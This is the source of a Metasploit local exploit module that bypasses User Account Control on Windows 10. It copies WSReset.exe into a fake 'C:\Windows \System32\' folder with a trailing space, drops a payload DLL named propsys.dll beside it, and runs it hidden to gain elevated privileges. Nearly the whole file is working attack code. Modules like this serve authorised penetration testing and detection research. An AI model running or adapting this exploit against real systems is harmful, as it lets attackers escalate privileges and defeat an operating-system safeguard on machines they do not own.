# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Post::Windows::Priv
  include Post::Windows::Runas

  def initialize(info = {})
    super(
      update_info( info,
        &#039;Name&#039;          => &#039;Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)&#039;,
        &#039;Description&#039;   => %q{
        This module exploits a flaw in the WSReset.exe Windows Store Reset Tool. The tool
        is run with the "autoElevate" property set to true, however it can be moved to
        a new Windows directory containing a space (C:\Windows \System32\) where, upon
        execution, it will load our payload dll (propsys.dll).
        },
        &#039;License&#039;       => MSF_LICENSE,
        &#039;Author&#039;        => [
          &#039;ACTIVELabs&#039;, # discovery
          &#039;sailay1996&#039;, # poc
          &#039;timwr&#039;,      # metasploit module
        ],
        &#039;Platform&#039;      => [&#039;win&#039;],
        &#039;Targets&#039;       => [[ &#039;Automatic&#039;, {} ]],
        &#039;DefaultTarget&#039; => 0,
        &#039;DefaultOptions&#039; => {
          &#039;EXITFUNC&#039;     => &#039;process&#039;,
          &#039;WfsDelay&#039;     => 15
        },
        &#039;DisclosureDate&#039;  => &#039;Aug 22 2019&#039;,
        &#039;Notes&#039;           =>
        {
          &#039;SideEffects&#039; => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ],
        },
        &#039;References&#039;    => [
          [&#039;URL&#039;, &#039;https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html&#039;],
          [&#039;URL&#039;, &#039;https://github.com/sailay1996/UAC_bypass_windows_store&#039;],
          [&#039;URL&#039;, &#039;https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e&#039;],
        ],
      )
    )
  end

  def check
    if sysinfo[&#039;OS&#039;] =~ /Windows 10/ && is_uac_enabled? && exists?("C:\\Windows\\System32\\WSReset.exe")
      return CheckCode::Appears
    end
    CheckCode::Safe
  end

  def exploit
    if sysinfo[&#039;Architecture&#039;] == ARCH_X64 && session.arch == ARCH_X86
      fail_with(Failure::NoTarget, &#039;Running against WOW64 is not supported&#039;)
    end

    # Make sure we have a sane payload configuration
    if sysinfo[&#039;Architecture&#039;] != payload.arch.first
      fail_with(Failure::BadConfig, &#039;The payload should use the same architecture as the target&#039;)
    end

    check_permissions!

    case get_uac_level
    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
      fail_with(Failure::NotVulnerable,
                "UAC is set to &#039;Always Notify&#039;. This module does not bypass this setting, exiting...")
    when UAC_DEFAULT
      print_good(&#039;UAC is set to Default&#039;)
      print_good(&#039;BypassUAC can bypass this setting, continuing...&#039;)
    when UAC_NO_PROMPT
      print_warning(&#039;UAC set to DoNotPrompt - using ShellExecute "runas" method instead&#039;)
      shell_execute_exe
      return
    end

    exploit_win_dir = "C:\\Windows \\"
    exploit_dir = "C:\\Windows \\System32\\"
    exploit_file = exploit_dir + "WSReset.exe"
    unless exists? exploit_win_dir
      print_status("Creating directory &#039;#{exploit_win_dir}&#039;...")
      session.fs.dir.mkdir(exploit_win_dir)
    end
    unless exists? exploit_dir
      print_status("Creating directory &#039;#{exploit_dir}&#039;...")
      session.fs.dir.mkdir(exploit_dir)
    end
    unless exists? exploit_file
      session.fs.file.copy("C:\\Windows\\System32\\WSReset.exe", exploit_file)
    end

    payload_dll = "C:\\Windows \\System32\\propsys.dll"
    print_status("Creating payload &#039;#{payload_dll}&#039;...")
    payload = generate_payload_dll
    write_file(payload_dll, payload)
    print_status("Executing WSReset.exe...")
    begin
      session.sys.process.execute("cmd.exe /c \"#{exploit_file}\"", nil, {&#039;Hidden&#039; => true})
    rescue ::Exception => e
      print_error(e.to_s)
    end
    print_warning("This exploit requires manual cleanup of the &#039;#{exploit_win_dir}&#039; and &#039;#{exploit_dir}&#039; directories!")
  end

  def check_permissions!
    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    end
    fail_with(Failure::None, &#039;Already in elevated state&#039;) if is_admin? || is_system?
    # Check if you are an admin
    # is_in_admin_group can be nil, true, or false
    print_status(&#039;UAC is Enabled, checking level...&#039;)
    vprint_status(&#039;Checking admin status...&#039;)
    admin_group = is_in_admin_group?
    if admin_group.nil?
      print_error(&#039;Either whoami is not there or failed to execute&#039;)
      print_error(&#039;Continuing under assumption you already checked...&#039;)
    else
      if admin_group
        print_good(&#039;Part of Administrators group! Continuing...&#039;)
      else
        fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, &#039;Cannot BypassUAC from Low Integrity Level&#039;)
    end
  end
end

